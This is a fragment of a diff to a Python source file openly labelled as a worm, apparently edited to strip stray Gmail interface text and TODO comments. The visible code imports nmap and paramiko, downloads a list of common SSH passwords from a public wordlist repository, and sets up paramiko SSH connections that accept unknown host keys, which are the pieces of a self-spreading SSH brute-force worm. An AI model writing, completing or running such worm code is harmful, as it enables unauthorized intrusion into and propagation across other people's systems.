@@ -1,14 +1,6 @@
 # Worm in python language made by Frank
+# Made by Frank
 
-Konversationer
-Använder 2 953,47 GB
-Programpolicy
-Tillhandahålls av Google
-Senaste kontoaktivitet: för 57 minuter sedan
-Information
-Skriv:
-Nytt meddelande
-MinimeraSeparat fönsterStäng
 import nmap
 import paramiko
 import os
@@ -67,7 +59,7 @@ def download_ssh_passwords(filename):
         filename - Name to save the file as.
     """
 
-    # TODO:130 This wordlist contains only few passwords. You would need a bigger one for real bruteforcing. \_(OwO)_/
+   
 
     logger.debug("Downloading passwords...")
     url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
@@ -96,7 +88,7 @@ def connect_to_ssh(host, password):
         password - Password to use
     """
 
-    # TODO:120 Pass usernames to the function too
+  
 
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
